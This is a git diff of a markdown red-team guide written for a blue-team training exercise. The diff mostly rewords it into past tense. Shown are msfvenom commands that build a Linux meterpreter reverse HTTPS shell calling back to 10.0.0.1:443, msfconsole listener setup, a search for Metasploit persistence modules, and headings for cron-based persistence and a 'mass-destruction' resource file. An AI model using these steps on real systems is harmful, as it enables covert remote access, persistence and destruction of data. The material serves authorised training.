@@ -13,19 +13,19 @@ This is a guide to setting up a reverse shell and gaining persistance in the env
 
 ## <a name="scenario">Scenario</a>
 
-We will create a payload that will be ran on the blue team training environment 45 minutes after the blue team powers on and starts hardening their network. Our goal will be to stealthly persist as many systems as possilble day one. Day two if we have any persistance we will start to do things to alert the blue team of your presence. EX: Change background, delete firewall rules and remove files.
+We were told to create a payload that will be ran on the blue team training environment 45 minutes after the blue team powers on and starts hardening their network. Our goal was be to stealthly persist as many systems as possilble day one. Day two if we still had any persistance we were to make our presence known by the defenders.(EX: Change background, delete firewall rules and remove files)
 
 ### Hints   
 
-Linux 64x   
-firewall is up but systems require 80,443,53 outbound
+* Linux 64x   
+* firewall is up but systems require 80,443,53 outbound
 
 
 ## <a name="payload">Creating your Payload<a/>
 
-There is many ways to create a payload but one of the easiest is using msfvenom.  
-To find a payload to use you can list all payloads with `msfvenom -l payloads`   
-We can further filter this down to fit our requirements by piping this to grep   
+There are many ways to create a payload but one of the easiest is by using msfvenom.  
+Finding a payload to use can be done by listing all payloads with `msfvenom -l payloads`   
+We can further filter this down to fit our requirements by piping this to grep.   
 
 ```console
 root@kali:~# msfvenom -l payloads | grep linux/x64
@@ -49,7 +49,7 @@ root@kali:~# msfvenom -l payloads | grep linux/x64
 
 From this we can see that `linux/x64/meterpreter_reverse_https` would be a good payload to use.   
 
-To see the options you run   
+To see the options available for this payload:      
 ```console
 root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https --list-options
 Options for payload/linux/x64/meterpreter_reverse_https:                                                           
@@ -128,10 +128,10 @@ Evasion options for payload/linux/x64/meterpreter_reverse_https:
     ----  ---------------  --------  -----------
 ```
 
-You can see that the Basic options of LHOST and LPORT are required, to input these options you put the variables in after the the payload before the next argument.   
+You can see that the Basic options of LHOST and LPORT are required, to input these options you put the variables in after the the payload, before the next argument.   
 `msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   
 
-After this you other options that can be important are:   
+After this other important arguments are:   
 ```
 --arch              # Set Architecture    
 --platform          # Set Platform   
@@ -139,9 +139,9 @@ After this you other options that can be important are:
 -e                  # Set Encoders   
 -o                  # Set Outfile   
 ```
-All of these options can be used with --list to show valid options.   
+All of these arguments can be used with --list to show valid options.   
 
-For our Senario -f elf will work.
+For our Senario -f elf was used.
 
 The final command should look as follows:   
 ```console
@@ -159,7 +159,7 @@ Saved as: reverse_shell
 
 First we will need to allow traffic though our redirector to receive our payloads.  For a reference on how to do this visit my [Redirector](https://github.com/vipertooth/Notes/blob/master/digitalocean/redirector.md) and [Iptables](https://github.com/vipertooth/Notes/blob/master/digitalocean/setup.md#setting-up-iptables-rules) writeup.   
 
-To catch our callback we will use metasploit, to start we metasploit we run msfconsole.
+To catch our callback we will use metasploit, to start metasploit run msfconsole.
 
 ```console
 root@kali:~# msfconsole
@@ -257,7 +257,7 @@ This will allow metasploit to catch meterpreter shells untill the job is killed.
 
 ## <a name="persistence">Gaining Persistence<a/>
 
-We can start by searching all the metasploit modules for persistence with the search command.
+To find a way to persist we can start by searching all the metasploit modules for persistence with the search command.
 
 ```console
 msf5 > search persistence
@@ -357,7 +357,7 @@ Description:
   of the cron entry.
   ```
   
-  We decided to use this module during testing.  We found that it worked however it was very easy to notice that there was an adversary on the box and where to find the persistance.  Instead we decided to use a custom exploit based on this module.
+We decided to use this module during testing.  We found that it worked however it was very easy to notice that there was an adversary on the box and where to find the his persistance.  Instead we decided to use a custom exploit based on this module.
   
 To do that we created a resource file for metasploit that will upload a payload and execute it.
 
@@ -433,7 +433,7 @@ end
 
 ## <a name="destruction">Destruction<a/>
 
-To destroy all remaining systems we can run a resource file:   
+To destroy all remaining systems we also ran a resource file:   
 mass-destruction.rc  
 ```ruby
 <ruby>
